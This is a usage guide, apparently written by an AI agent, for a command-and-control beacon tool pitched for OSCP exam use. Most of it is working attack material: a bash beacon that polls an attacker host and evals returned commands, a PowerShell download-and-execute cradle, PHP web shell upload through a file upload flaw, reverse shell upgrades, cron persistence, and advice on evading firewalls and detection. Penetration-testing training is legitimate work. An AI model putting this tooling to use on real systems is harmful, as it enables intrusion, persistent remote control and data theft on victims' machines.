# HTTP Beacon System - Usage Guide

## Overview

The HTTP beacon system provides a lightweight C2-style infrastructure for web shell callbacks and remote command execution. This is particularly useful during OSCP exam scenarios where you have web shell access but need better command-and-control capabilities.

**Use Cases:**
- Web shell command queueing
- Persistent access via HTTP callbacks
- Transitioning from web shells to TCP reverse shells
- Covert communication using HTTP/HTTPS

---

## Quick Start

### 1. Start HTTP Beacon Listener

```bash
# Basic HTTP listener
crack session http-start --port 8080

# HTTPS listener with self-signed cert
crack session http-start --port 443 --https

# Custom host binding
crack session http-start --port 8080 --host 0.0.0.0
```

**Output:**
```
[*] Starting HTTP beacon listener on 0.0.0.0:8080
[*] Beacon URL: http://<LHOST>:8080/beacon
[*] Registration endpoint: http://<LHOST>:8080/register
```

### 2. Generate Beacon Script

```bash
# Generate bash beacon
crack session beacon-gen bash http://192.168.45.150:8080 -o beacon.sh

# Generate PHP web shell beacon
crack session beacon-gen php_web http://192.168.45.150:8080 -o shell.php

# Generate PowerShell beacon
crack session beacon-gen powershell http://192.168.45.150:8080 -o beacon.ps1

# Custom interval and jitter
crack session beacon-gen bash http://192.168.45.150:8080 \
    --interval 10 \
    --jitter 5 \
    -o beacon.sh
```

**Output:**
```
[+] Beacon script written to: beacon.sh
[*] Session ID: a1b2c3d4-1234-5678-90ab-cdef12345678
[*] Beacon URL: http://192.168.45.150:8080/beacon
[*] Interval: 10s (jitter: 5s)

[*] Next steps:
    1. Upload beacon.sh to target
    2. Execute on target: bash beacon.sh
    3. Wait for beacon registration
    4. Send commands: crack session beacon-send a1b2c3d4... <command>
```

### 3. Upload and Execute Beacon

**Linux Target:**
```bash
# Upload via web shell
curl -X POST http://target.com/upload.php -F "file=@beacon.sh"

# Execute
bash beacon.sh &
```

**Windows Target (PowerShell):**
```powershell
# Download and execute
IEX(New-Object Net.WebClient).DownloadString('http://192.168.45.150:8080/beacon.ps1')
```

**PHP Web Shell:**
```bash
# Upload shell.php to web server
curl -X POST http://target.com/upload.php -F "file=@shell.php"

# Access via browser to activate beacon
# Beacon will auto-poll every 5 seconds
```

### 4. Send Commands

```bash
# Basic command
crack session beacon-send a1b2c3d4-1234 "whoami"

# Enumeration commands
crack session beacon-send a1b2c3d4-1234 "uname -a"
crack session beacon-send a1b2c3d4-1234 "id"
crack session beacon-send a1b2c3d4-1234 "hostname"

# Chained commands
crack session beacon-send a1b2c3d4-1234 "whoami && id && hostname"
```

### 5. Get Command Responses

```bash
# Get last response
crack session beacon-get a1b2c3d4-1234

# Get all responses
crack session beacon-get a1b2c3d4-1234 --all

# Clear response history
crack session beacon-get a1b2c3d4-1234 --clear
```

### 6. Upgrade to TCP Reverse Shell

```bash
# Auto-detect capabilities and upgrade
crack session http-upgrade a1b2c3d4-1234 \
    --lhost 192.168.45.150 \
    --lport 4444

# Force specific payload
crack session http-upgrade a1b2c3d4-1234 \
    --lhost 192.168.45.150 \
    --lport 4444 \
    --payload python3

# Custom timeout
crack session http-upgrade a1b2c3d4-1234 \
    --lhost 192.168.45.150 \
    --lport 4444 \
    --timeout 60
```

**Output:**
```
[*] Upgrading HTTP session a1b2c3d4 to TCP reverse shell
[*] Listener: 192.168.45.150:4444
[*] Payload type: auto-detect
[*] Detecting capabilities...
[*] Detected: Linux (bash), Tools: python3, nc, perl
[*] Using payload type: python3
[*] Generated payload: python3 -c 'import socket...'
[*] Starting TCP listener on 192.168.45.150:4444
[*] Injecting payload via beacon...
[*] Waiting for connection...
[+] Connection received from 192.168.45.200:54321
[+] Successfully upgraded to TCP session tcp-789
[*] HTTP session marked as 'upgraded'
```

---

## Beacon Types

### Bash Beacon

**Requirements:**
- curl or wget
- jq (optional, for JSON parsing)
- bash

**Features:**
- System info gathering
- Command execution with output capture
- Configurable interval and jitter
- Error handling

**Example Script:**
```bash
#!/bin/bash
SESSION_ID="a1b2c3d4-1234-5678-90ab-cdef12345678"
BEACON_URL="http://192.168.45.150:8080/beacon"
INTERVAL=5

while true; do
    # Execute command if provided
    if [ -n "$LAST_CMD" ]; then
        LAST_OUTPUT=$(eval "$LAST_CMD" 2>&1)
    fi

    # Send beacon
    RESPONSE=$(curl -s -X POST "$BEACON_URL" \
        -H "Content-Type: application/json" \
        -d "{\"session_id\": \"$SESSION_ID\", \"response\": \"$LAST_OUTPUT\"}")

    # Get next command
    LAST_CMD=$(echo "$RESPONSE" | jq -r '.command // empty')

    sleep $INTERVAL
done
```

### PHP Beacon (CLI)

**Requirements:**
- PHP CLI
- curl extension

**Features:**
- JSON communication
- Shell command execution
- Auto-registration

**Use Case:** PHP-enabled Linux targets

### PHP Web Beacon

**Requirements:**
- PHP web server
- curl extension

**Features:**
- Web shell interface
- Auto-beacon via JavaScript
- Manual command execution
- Session persistence

**Use Case:** Web application exploitation

**Example Workflow:**
1. Upload `shell.php` to web server
2. Access via browser: `http://target.com/shell.php`
3. Beacon auto-activates (polls every 5s)
4. Use web form for manual commands OR use beacon queue

### PowerShell Beacon

**Requirements:**
- PowerShell 3.0+

**Features:**
- Invoke-RestMethod communication
- JSON payload handling
- Error handling

**Use Case:** Windows targets

### Python Beacon

**Requirements:**
- Python 2.7+ or Python 3.x
- requests library (fallback to urllib)

**Features:**
- Cross-platform (Linux/Windows)
- Subprocess command execution
- Robust error handling

**Use Case:** Systems with Python available

---

## Upgrade Payloads

### Available Payload Types

| Payload | OS | Requirements | Notes |
|---------|----|--------------| ------|
| `bash` | Linux | bash, /dev/tcp | Most reliable |
| `bash_mkfifo` | Linux | bash, nc | Named pipe method |
| `nc_e` | Linux | netcat with -e | Traditional netcat |
| `nc_c` | Linux | netcat with -c | BSD netcat |
| `python` | Linux | Python 2 | Older systems |
| `python3` | Linux | Python 3 | Modern systems |
| `perl` | Linux | Perl | Universal |
| `php` | Linux | PHP CLI | Web servers |
| `ruby` | Linux | Ruby | Rare |
| `powershell` | Windows | PowerShell | Windows default |

### Auto-Detection

The upgrader automatically tests for:
- Operating system (Linux vs Windows)
- Shell type (bash, sh, cmd, powershell)
- Available tools (python, nc, perl, etc.)
- Recommended payload based on capabilities

**Detection Commands:**
```bash
uname -s || echo Windows         # OS detection
echo $SHELL || echo %COMSPEC%   # Shell detection
which python3 2>/dev/null        # Tool detection
```

---

## OSCP Exam Scenarios

### Scenario 1: Web Shell to Reverse Shell

**Situation:** You have PHP web shell access but need a proper reverse shell.

**Solution:**
```bash
# 1. Start HTTP beacon listener
crack session http-start --port 8080

# 2. Generate PHP web beacon
crack session beacon-gen php_web http://192.168.45.150:8080 -o shell.php

# 3. Upload shell.php to target
# (via existing web shell or file upload vulnerability)

# 4. Access shell.php in browser
# Beacon auto-activates

# 5. Verify beacon registration
crack session list --type http

# 6. Upgrade to TCP reverse shell
crack session http-upgrade <session-id> --lhost 192.168.45.150 --lport 4444

# 7. You now have a TCP reverse shell!
```

### Scenario 2: Persistent Access

**Situation:** You need persistent access that survives reboots.

**Solution:**
```bash
# 1. Generate bash beacon with long interval
crack session beacon-gen bash http://192.168.45.150:8080 \
    --interval 60 \  # 1 minute interval
    --jitter 30 \     # Random 0-30s jitter
    -o beacon.sh

# 2. Upload and execute as background service
# Add to crontab:
@reboot /path/to/beacon.sh &

# 3. Commands queue until beacon polls
# No active connection required
```

### Scenario 3: Firewall Evasion

**Situation:** Outbound TCP connections blocked, but HTTP/HTTPS allowed.

**Solution:**
```bash
# 1. Start HTTPS beacon listener
crack session http-start --port 443 --https

# 2. Generate beacon (HTTPS URL)
crack session beacon-gen bash https://192.168.45.150:443 -o beacon.sh

# 3. Execute on target
# Beacon uses HTTPS (port 443) - typically allowed outbound

# 4. Commands work over HTTPS
crack session beacon-send <session-id> "whoami"

# 5. Upgrade to TCP if needed later
# (Try different ports or techniques)
```

---

## Advanced Usage

### Custom Beacon Intervals

**Short interval (fast response):**
```bash
crack session beacon-gen bash http://192.168.45.150:8080 \
    --interval 2 \
    --jitter 0 \
    -o fast_beacon.sh
```

**Long interval (low detection):**
```bash
crack session beacon-gen bash http://192.168.45.150:8080 \
    --interval 300 \  # 5 minutes
    --jitter 60 \      # ±1 minute
    -o slow_beacon.sh
```

### Multiple Beacons

```bash
# Start listener
crack session http-start --port 8080

# Generate multiple beacons for different targets
crack session beacon-gen bash http://192.168.45.150:8080 -o beacon_target1.sh
crack session beacon-gen bash http://192.168.45.150:8080 -o beacon_target2.sh
crack session beacon-gen bash http://192.168.45.150:8080 -o beacon_target3.sh

# Each beacon gets unique session ID
# All report to same listener
# Manage independently with session IDs
```

### Beacon Response History

```bash
# View last 10 responses
crack session beacon-get <session-id> --all | tail -20

# Search responses
crack session beacon-get <session-id> --all | grep "root"

# Export responses to file
crack session beacon-get <session-id> --all > responses.txt
```

---

## Troubleshooting

### Beacon Not Connecting

**Symptoms:** No beacon registration after execution.

**Checks:**
1. Verify listener is running: `crack session list`
2. Check firewall rules: `sudo iptables -L -n -v`
3. Verify network connectivity: `ping <LHOST>`
4. Check beacon URL in script matches listener
5. Review beacon script logs (stderr output)

**Common Issues:**
- Wrong LHOST IP in beacon URL
- Firewall blocking port
- SELinux/AppArmor blocking connections
- Web server user cannot make outbound connections

### Upgrade Failing

**Symptoms:** HTTP upgrade times out.

**Checks:**
1. Verify capabilities: `crack session beacon-send <id> "which python3"`
2. Test payload manually
3. Increase timeout: `--timeout 60`
4. Try different payload: `--payload bash`

**Common Issues:**
- Selected payload not available on target
- Firewall blocking reverse shell
- Wrong LHOST/LPORT
- Target cannot resolve hostnames (use IP)

### Commands Not Executing

**Symptoms:** Commands queue but no responses.

**Checks:**
1. Verify beacon is polling: Check last_seen timestamp
2. Check command queue: `crack session info <id>`
3. Test simple command: `crack session beacon-send <id> "echo test"`

**Common Issues:**
- Beacon process died
- Syntax errors in command
- Command requires TTY (use upgrade)

---

## Security Considerations

### OPSEC (Operational Security)

**Considerations:**
1. **Traffic Visibility:** HTTP beacons generate regular traffic
2. **User-Agent:** Default curl/PowerShell user-agents are suspicious
3. **Beacon Interval:** Too frequent = noisy, too slow = unresponsive
4. **Payload Obfuscation:** Consider encoding payloads
5. **HTTPS:** Use HTTPS to encrypt beacon traffic

**Recommendations:**
- Use jitter to randomize beacon intervals
- Use HTTPS listeners when possible
- Clean up beacons after use
- Monitor for IDS/IPS alerts

### OSCP Exam Notes

**Allowed:**
- HTTP beacons (C2 infrastructure is permitted)
- Web shell to reverse shell transitions
- Command queueing for slow access

**Best Practices:**
- Document all beacon sessions in report
- Screenshot beacon registration
- Note upgrade methods used
- Clean up listeners after exam

---

## Example Workflow (Complete)

### Objective: Gain shell on web server with restricted outbound access

```bash
# 1. Enumerate web application
crack html-enum http://192.168.45.200
# Found file upload vulnerability

# 2. Start HTTP beacon listener
crack session http-start --port 8080
# Listener started on 192.168.45.150:8080

# 3. Generate PHP web beacon
crack session beacon-gen php_web http://192.168.45.150:8080 -o shell.php
# Generated shell.php with session ID: a1b2c3d4-1234

# 4. Upload shell.php via file upload vulnerability
curl -X POST http://192.168.45.200/upload.php -F "file=@shell.php"
# Uploaded successfully

# 5. Access shell.php to activate beacon
curl http://192.168.45.200/uploads/shell.php
# Beacon registered automatically

# 6. Verify beacon is active
crack session list --type http
# Shows session a1b2c3d4-1234 (active)

# 7. Enumerate target
crack session beacon-send a1b2c3d4-1234 "uname -a"
crack session beacon-send a1b2c3d4-1234 "id"
crack session beacon-send a1b2c3d4-1234 "ls -la /home"

# 8. Get responses
crack session beacon-get a1b2c3d4-1234 --all
# Linux victim-pc 5.10.0 x86_64
# uid=33(www-data) gid=33(www-data)
# Found user: alice

# 9. Attempt privilege escalation enumeration via beacon
crack session beacon-send a1b2c3d4-1234 "find / -perm -4000 2>/dev/null"
crack session beacon-send a1b2c3d4-1234 "sudo -l"

# 10. Upgrade to TCP reverse shell for better access
crack session http-upgrade a1b2c3d4-1234 \
    --lhost 192.168.45.150 \
    --lport 4444
# Detected python3
# Payload injected
# Connection received!
# New session: tcp-789

# 11. Now have full TCP reverse shell
# Upgrade to TTY if needed
crack session upgrade tcp-789 --method python

# 12. Continue with privilege escalation
```

---

## API Reference

### Beacon Protocol

**Beacon Heartbeat (POST /beacon):**
```json
{
    "session_id": "uuid",
    "hostname": "victim-pc",
    "username": "www-data",
    "os": "Linux",
    "shell_type": "bash",
    "response": "command output here"
}
```

**Response:**
```json
{
    "command": "next command to execute",
    "session_id": "uuid"
}
```

**Registration (POST /register):**
```json
{
    "hostname": "victim-pc",
    "username": "www-data",
    "os": "Linux",
    "shell_type": "bash",
    "target": "192.168.45.200"
}
```

**Response:**
```json
{
    "session_id": "generated-uuid",
    "listener_id": "listener-uuid",
    "beacon_url": "http://192.168.45.150:8080/beacon"
}
```

**Health Check (GET /health):**
```json
{
    "status": "running",
    "listener_id": "uuid",
    "active_sessions": 3,
    "protocol": "http",
    "port": 8080
}
```

---

## References

**Related Documentation:**
- `sessions/README.md` - Session management overview
- `sessions/listeners/` - Listener implementations
- `sessions/shell/` - Shell upgrade modules

**OSCP Resources:**
- Reverse Shell Cheat Sheet: https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
- Web Shell Detection: https://www.acunetix.com/blog/articles/web-shells-101-using-php-introduction-web-shells-part-2/
- HTTP C2 Design: https://attack.mitre.org/techniques/T1071/001/

**Author:** Agent F1-B (HTTP Beacon System)
**Version:** 1.0.0
**Last Updated:** 2025-10-09
